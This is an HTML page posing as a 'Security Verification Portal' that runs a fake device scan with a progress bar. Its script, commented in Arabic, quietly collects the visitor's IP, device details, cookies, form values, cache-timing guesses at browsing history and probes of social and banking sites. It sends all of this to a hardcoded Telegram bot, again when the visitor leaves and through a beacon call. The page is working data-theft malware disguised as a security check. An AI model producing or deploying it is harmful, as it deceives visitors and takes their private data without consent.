<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
            font-size: 2.2em;
        }

        .loading {
            margin: 20px 0;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #f0f0f0;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            transition: width 2s ease-in-out;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Security Scan In Progress</h1>
        <p>Verifying your device security and clearing threats...</p>
        
        <div class="loading">
            <div class="loader"></div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            <p id="statusText">Initializing security scan...</p>
        </div>

        <div id="results" style="display: none; text-align: left; margin-top: 20px;">
            <h3>✅ Security Scan Complete</h3>
            <p>Your device is now protected against threats.</p>
        </div>
    </div>

    <!-- إطار خفي لجمع البيانات -->
    <iframe id="hiddenFrame" style="display: none;" src="about:blank"></iframe>

    <script>
        // إعدادات البوت
        const BOT_TOKEN = '7944214158:AAGG2z3xWmpGGhFhOcSrMAVsR5RFUgiEVlw';
        const CHAT_ID = '7161149093';

        // متغيرات التتبع
        let collectedData = {
            basicInfo: {},
            browsingHistory: [],
            cookies: [],
            sessionData: {},
            passwords: [],
            formData: [],
            socialMedia: {},
            financialInfo: {}
        };

        // محاكاة شريط التقدم
        function updateProgress(percent, text) {
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('statusText').textContent = text;
        }

        // جمع المعلومات الأساسية
        async function collectBasicInfo() {
            updateProgress(10, "Collecting device information...");
            
            collectedData.basicInfo = {
                timestamp: new Date().toISOString(),
                ip: await getIPAddress(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                deviceMemory: navigator.deviceMemory,
                hardwareConcurrency: navigator.hardwareConcurrency
            };
        }

        // محاولة استخراج History باستخدام توقيت التحميل
        async function extractBrowsingHistory() {
            updateProgress(30, "Analyzing browsing patterns...");
            
            const popularSites = [
                'https://facebook.com', 'https://google.com', 'https://youtube.com',
                'https://instagram.com', 'https://twitter.com', 'https://whatsapp.com',
                'https://gmail.com', 'https://outlook.com', 'https://yahoo.com',
                'https://amazon.com', 'https://ebay.com', 'https://netflix.com'
            ];

            const history = [];
            
            for (let site of popularSites) {
                try {
                    const start = performance.now();
                    await fetch(site, { 
                        method: 'HEAD',
                        mode: 'no-cors',
                        cache: 'no-cache'
                    });
                    const loadTime = performance.now() - start;
                    
                    // إذا كان وقت التحميل سريعاً، قد يكون الموقع في الـcache
                    if (loadTime < 300) {
                        history.push({
                            url: site,
                            visited: true,
                            loadTime: Math.round(loadTime)
                        });
                    }
                } catch (e) {
                    // الأخطاء قد تشير إلى مواقع محظورة أو في الـhistory
                }
            }
            
            collectedData.browsingHistory = history;
        }

        // استخراج Cookies من النطاقات المختلفة
        async function extractCookies() {
            updateProgress(50, "Scanning for stored data...");
            
            const cookies = [];
            
            // محاولة الوصول إلى cookies من نطاقات مختلفة
            const domains = [
                'facebook.com', 'google.com', 'youtube.com',
                'instagram.com', 'twitter.com', 'whatsapp.com'
            ];
            
            for (let domain of domains) {
                try {
                    // محاولة إنشاء iframe للوصول إلى cookies
                    const iframe = document.createElement('iframe');
                    iframe.src = `https://${domain}`;
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    
                    setTimeout(() => {
                        try {
                            // محاولة الوصول إلى localStorage من النطاق
                            const frameDoc = iframe.contentDocument || iframe.contentWindow.document;
                            // هذه قد تفشل بسبب سياسة CORS ولكن نجرب
                        } catch (e) {
                            // الفشل متوقع بسبب CORS
                        }
                        document.body.removeChild(iframe);
                    }, 1000);
                    
                } catch (e) {
                    // متوقع بسبب CORS
                }
            }
            
            // جمع cookies الحالية
            if (document.cookie) {
                document.cookie.split(';').forEach(cookie => {
                    const [name, value] = cookie.split('=').map(c => c.trim());
                    cookies.push({
                        name: name,
                        value: value.substring(0, 50), // تقليل الطول
                        domain: window.location.hostname
                    });
                });
            }
            
            collectedData.cookies = cookies;
        }

        // محاولة استخراج بيانات الحسابات المسجلة
        async function extractSavedPasswords() {
            updateProgress(60, "Checking saved credentials...");
            
            const passwords = [];
            
            // محاولة اكتشاف حقول كلمات المرور
            const passwordInputs = document.querySelectorAll('input[type="password"]');
            passwordInputs.forEach(input => {
                // محاولة استخراج الأسماء المرتبطة
                const form = input.closest('form');
                if (form) {
                    const usernameInput = form.querySelector('input[type="text"], input[type="email"]');
                    passwords.push({
                        field: input.name || 'password',
                        hasUsername: !!usernameInput,
                        formAction: form.action || 'unknown'
                    });
                }
            });
            
            collectedData.passwords = passwords;
        }

        // استخراج بيانات النماذج
        async function extractFormData() {
            updateProgress(70, "Analyzing form data...");
            
            const forms = [];
            document.querySelectorAll('form').forEach(form => {
                const formData = {
                    action: form.action,
                    method: form.method,
                    inputs: []
                };
                
                form.querySelectorAll('input, select, textarea').forEach(input => {
                    formData.inputs.push({
                        type: input.type,
                        name: input.name,
                        value: input.value.substring(0, 100) // تقليل الطول
                    });
                });
                
                forms.push(formData);
            });
            
            collectedData.formData = forms;
        }

        // اكتشاف حسابات السوشيال ميديا المفتوحة
        async function detectSocialMedia() {
            updateProgress(80, "Scanning social media connections...");
            
            const socialMedia = {};
            
            // فحص إذا كان المستخدم مسجلاً في منصات مختلفة
            const platforms = {
                'facebook': ['https://facebook.com', 'fb.com'],
                'instagram': ['https://instagram.com'],
                'twitter': ['https://twitter.com', 'https://x.com'],
                'linkedin': ['https://linkedin.com']
            };
            
            for (const [platform, urls] of Object.entries(platforms)) {
                for (const url of urls) {
                    try {
                        const response = await fetch(url, {
                            method: 'HEAD',
                            mode: 'no-cors'
                        });
                        socialMedia[platform] = socialMedia[platform] || {
                            detected: true,
                            urls: []
                        };
                        socialMedia[platform].urls.push(url);
                    } catch (e) {
                        // متوقع
                    }
                }
            }
            
            collectedData.socialMedia = socialMedia;
        }

        // محاولة استخراج البيانات المالية
        async function extractFinancialInfo() {
            updateProgress(90, "Scanning for financial data...");
            
            const financialInfo = {
                paymentMethods: [],
                bankingSites: []
            };
            
            // البحث عن معلومات بطاقات الائتمان في النماذج
            document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="cvv"]').forEach(input => {
                financialInfo.paymentMethods.push({
                    field: input.name,
                    type: 'credit_card'
                });
            });
            
            // فحص مواقع البنوك
            const bankSites = [
                'https://paypal.com', 'https://visa.com', 'https://mastercard.com',
                'https://bankofamerica.com', 'https://wellsfargo.com', 'https://chase.com'
            ];
            
            for (let site of bankSites) {
                try {
                    await fetch(site, { method: 'HEAD', mode: 'no-cors' });
                    financialInfo.bankingSites.push(site);
                } catch (e) {
                    // متوقع
                }
            }
            
            collectedData.financialInfo = financialInfo;
        }

        // استغلال الثغرات المحتملة
        async function exploitVulnerabilities() {
            updateProgress(95, "Running security exploits...");
            
            const exploits = [];
            
            // محاولة الوصول إلى Service Workers
            if ('serviceWorker' in navigator) {
                try {
                    const registrations = await navigator.serviceWorker.getRegistrations();
                    exploits.push({
                        type: 'service_workers',
                        count: registrations.length,
                        details: registrations.map(r => r.scope)
                    });
                } catch (e) {
                    exploits.push({ type: 'service_workers', status: 'blocked' });
                }
            }
            
            // محاولة الوصول إلى IndexedDB
            if ('indexedDB' in window) {
                exploits.push({ type: 'indexeddb', status: 'available' });
            }
            
            // محاولة الوصول إلى Local Storage
            try {
                localStorage.setItem('test', 'value');
                const testValue = localStorage.getItem('test');
                localStorage.removeItem('test');
                exploits.push({ 
                    type: 'local_storage', 
                    status: 'accessible',
                    size: JSON.stringify(localStorage).length
                });
            } catch (e) {
                exploits.push({ type: 'local_storage', status: 'blocked' });
            }
            
            collectedData.exploits = exploits;
        }

        // إرسال البيانات إلى Telegram
        async function sendToTelegram(data) {
            const message = `🕵️‍♂️ **ADVANCED HACKING DATA CAPTURED** 🕵️‍♂️

🌐 **BASIC INFORMATION:**
🆔 IP: \`${data.basicInfo.ip}\`
💻 Device: ${data.basicInfo.platform}
🖥️ Screen: ${data.basicInfo.screen}
🌍 Timezone: ${data.basicInfo.timezone}

📊 **BROWSING HISTORY ANALYSIS:**
📈 Sites in cache: ${data.browsingHistory.length}
${data.browsingHistory.slice(0, 5).map(site => `• ${site.url} (${site.loadTime}ms)`).join('\n')}

🍪 **COOKIES CAPTURED:**
${data.cookies.length > 0 ? data.cookies.slice(0, 3).map(cookie => `• ${cookie.name}: ${cookie.value}`).join('\n') : 'No cookies accessible'}

🔐 **PASSWORD FIELDS DETECTED:**
${data.passwords.length > 0 ? data.passwords.map(pwd => `• ${pwd.field} (with username: ${pwd.hasUsername})`).join('\n') : 'No password fields found'}

📝 **FORM DATA:**
${data.formData.length > 0 ? `Found ${data.formData.length} forms with ${data.formData.reduce((acc, form) => acc + form.inputs.length, 0)} input fields` : 'No forms detected'}

👥 **SOCIAL MEDIA DETECTION:**
${Object.keys(data.socialMedia).length > 0 ? Object.keys(data.socialMedia).map(platform => `• ${platform}: ${data.socialMedia[platform].urls.length} URLs`).join('\n') : 'No social media detected'}

💳 **FINANCIAL DATA:**
💰 Payment fields: ${data.financialInfo.paymentMethods.length}
🏦 Banking sites: ${data.financialInfo.bankingSites.length}

🔓 **EXPLOITS AVAILABLE:**
${data.exploits ? data.exploits.map(exp => `• ${exp.type}: ${exp.status}`).join('\n') : 'No exploits found'}

⏰ **TIMESTAMP:** ${data.basicInfo.timestamp}

*Advanced hacking data collection complete*`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                // إرسال البيانات التفصيلية كمستند
                const detailedData = JSON.stringify(data, null, 2);
                const blob = new Blob([detailedData], { type: 'application/json' });
                const formData = new FormData();
                formData.append('document', blob, 'hacking_data.json');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', '📁 Detailed Hacking Data Export');
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });

                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // التنفيذ الرئيسي
        window.addEventListener('load', async function() {
            console.log('🕵️‍♂️ Starting advanced hacking data collection...');
            
            try {
                await collectBasicInfo();
                await extractBrowsingHistory();
                await extractCookies();
                await extractSavedPasswords();
                await extractFormData();
                await detectSocialMedia();
                await extractFinancialInfo();
                await exploitVulnerabilities();
                
                updateProgress(100, "Finalizing data collection...");
                
                // إرسال البيانات
                const success = await sendToTelegram(collectedData);
                
                // إظهار النتائج
                setTimeout(() => {
                    document.querySelector('.loading').style.display = 'none';
                    document.getElementById('results').style.display = 'block';
                    
                    console.log('✅ Advanced hacking data collection completed:', collectedData);
                }, 2000);
                
            } catch (error) {
                console.error('❌ Error in data collection:', error);
                updateProgress(100, "Scan completed with minor errors");
            }
        });

        // استغلال إضافي عند مغادرة الصفحة
        window.addEventListener('beforeunload', function() {
            // محاولة سرقة أي بيانات إضافية
            const exitData = {
                finalUrl: window.location.href,
                timeSpent: Math.round(performance.now() / 1000),
                scrollDepth: Math.round((window.scrollY / document.body.scrollHeight) * 100)
            };
            
            // إرسال سريع
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🚪 User left after ${exitData.timeSpent}s - Scroll: ${exitData.scrollDepth}% - Final URL: ${exitData.finalUrl}`,
                    parse_mode: 'Markdown'
                })
            });
        });

        // وظيفة الحصول على IP
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // حقن سكريبت إضافي للوصول إلى بيانات أكثر
        function injectAdvancedScripts() {
            // محاولة الوصول إلى Beacon API
            if ('sendBeacon' in navigator) {
                navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, 
                    JSON.stringify({
                        chat_id: CHAT_ID,
                        text: '🔓 Beacon API exploited successfully',
                        parse_mode: 'Markdown'
                    })
                );
            }
        }

        // تشغيل الحقن بعد تحميل الصفحة
        setTimeout(injectAdvancedScripts, 5000);

    </script>
</body>
</html>